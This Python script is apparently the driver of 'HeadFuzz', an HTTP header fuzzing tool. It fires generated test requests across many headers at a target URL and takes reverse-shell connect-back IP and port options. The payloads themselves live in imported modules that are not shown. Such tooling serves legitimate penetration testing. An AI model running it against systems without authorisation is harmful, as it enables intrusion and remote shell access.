#!/usr/bin/python3

import sys
sys.dont_write_bytecode=True
import argparse
import concurrent.futures
import time
from time import sleep
import logging, coloredlogs
import requests
import os
from headers import *
from worker import *
from utils import *


def print_banner():
    banner = '''
 /$$   /$$                           /$$       /$$$$$$$$                           
| $$  | $$                          | $$      | $$_____/                           
| $$  | $$  /$$$$$$   /$$$$$$   /$$$$$$$      | $$    /$$   /$$ /$$$$$$$$ /$$$$$$$$
| $$$$$$$$ /$$__  $$ |____  $$ /$$__  $$      | $$$$$| $$  | $$|____ /$$/|____ /$$/
| $$__  $$| $$$$$$$$  /$$$$$$$| $$  | $$      | $$__/| $$  | $$   /$$$$/    /$$$$/ 
| $$  | $$| $$_____/ /$$__  $$| $$  | $$      | $$   | $$  | $$  /$$__/    /$$__/  
| $$  | $$|  $$$$$$$|  $$$$$$$|  $$$$$$$      | $$   |  $$$$$$/ /$$$$$$$$ /$$$$$$$$
|__/  |__/ \_______/ \_______/ \_______/      |__/    \______/ |________/|________/
'''
    for line in banner.split("\n"):
        sleep(0.1)
        print(line)

def print_stats():
    print("<<===============================================================================>>")
    print("\t" + "- Thread pool max workers: " + str(Config.max_workers))
    print("\t" + "- Test generation level: " + str(Config.test_level))
    print("\t" + "- Log verbosity level: " + str(Config.verbosity))
    print("\t" + "- Reverse Shell IP Address: " + Config.revshell_ip)
    print("\t" + "- Reverse Shell Port: " + str(Config.revshell_port))
    print("<<===============================================================================>>")

def print_req_count():
    print("\t" + "- Total amount of network requests: " + str(len(test_array)))
    print("<<===============================================================================>>")
    print()
def print_unreachable_err():
    print()
    logger.critical("Host seems unreachable, are you sure that it is up?")
    print()

def initial_request(destination):
    try:
        response = requests.get(
            destination,
            headers = {
                "User-Agent" : "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0"
            },
            timeout = 5
        )
        return response
    except:
        return None


# =========================================================================================

parser = argparse.ArgumentParser(description='A simple HTTP Header fuzzing script')
parser.add_argument('-u','--url', help='The target URL address', required=True)
parser.add_argument('-m','--max-workers', help='Total amount of concurrent workers', default=20, type=int)
parser.add_argument('-l','--level', choices=[1, 2, 3], help='Deepness of fuzzing test generation', default=1, type=int)
parser.add_argument('-v','--verbosity', choices=[1, 2, 3, 4, 5], help='Level of chattiness', default=1, type=int)
parser.add_argument('--static-cookie', help='The static cookies that will be sent with requests', default="")
parser.add_argument('--revshell-ip', help='The IP adress to connect back from target', default="0.0.0.0")
parser.add_argument('--revshell-port', help='The port number to connect back from target', default=1337, type=int)
parser.add_argument('--exclude-code', help='Exclude responses with status code of', default="400,403,405,422")
parser.add_argument('--include-code', help='Only include responses with status code of')
parser.add_argument('--log-file', help='Path of the logfile')
args = parser.parse_args()

# =========================================================================================

Config.max_workers   = args.max_workers
Config.test_level    = args.level
Config.verbosity     = args.verbosity
Config.revshell_ip   = args.revshell_ip
Config.revshell_port = args.revshell_port

cookie_dict = {}
for cookie_pair in args.static_cookie.split(";"):
    temp = cookie_pair.strip().split("=")
    if len(temp) == 2:
        cookie_dict[temp[0].strip()] = temp[1].strip()

Config.static_cookies = cookie_dict

Config.exclude_code  = args.exclude_code + ","
Config.exclude_code  = Config.exclude_code.split(",")[:-1]
if args.include_code:
    Config.include_code = args.include_code + ","
    Config.include_code = Config.include_code.split(",")[:-1]

# =========================================================================================

logger = logging.getLogger("HeadFuzz")

if Config.verbosity == 5:
    log_level_term = 'DEBUG'
    log_level_file = logging.DEBUG
elif Config.verbosity == 4:
    log_level_term = 'INFO'
    log_level_file = logging.INFO
elif Config.verbosity == 3:
    log_level_term = 'WARNING'
    log_level_file = logging.WARNING
elif Config.verbosity == 2:
    log_level_term = 'ERROR'
    log_level_file = logging.ERROR
elif Config.verbosity == 1:
    log_level_term = 'CRITICAL'
    log_level_file = logging.CRITICAL

if args.log_file:
    fh = logging.FileHandler(args.log_file, mode='w')
    fh.setLevel(log_level_file)
    formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
    fh.setFormatter(formatter)
    logger.addHandler(fh)

coloredlogs.install(level=log_level_term, logger=logger)

logger.debug("level enabled")
logger.info("level enabled")
logger.warning("level enabled")
logger.error("level enabled")
logger.critical("level enabled")

Config.logger = logger

# =========================================================================================

print_banner()
print_stats()

# =========================================================================================

initial_response = initial_request(args.url)
if initial_response is None:
    print_unreachable_err()
    exit()

Config.initial_response = initial_response

# =========================================================================================

test_array  = []
test_array += Accept(args.url).get_tests()
test_array += Authorization(args.url).get_tests()
test_array += ContentType(args.url).get_tests()
test_array += Cookie(args.url).get_tests()
test_array += Date(args.url).get_tests()
test_array += Expect(args.url).get_tests()
test_array += Forwarded(args.url).get_tests()
test_array += From(args.url).get_tests()
test_array += Host(args.url).get_tests()
test_array += Origin(args.url).get_tests()
test_array += Referer(args.url).get_tests()
test_array += UserAgent(args.url).get_tests()
test_array += Via(args.url).get_tests()
test_array += XForwardedFor(args.url).get_tests()

# =========================================================================================

print_req_count()

# =========================================================================================

worker = Executor()
with concurrent.futures.ThreadPoolExecutor(max_workers = Config.max_workers) as tp_executor:
    tp_executor.map(worker.execute, test_array)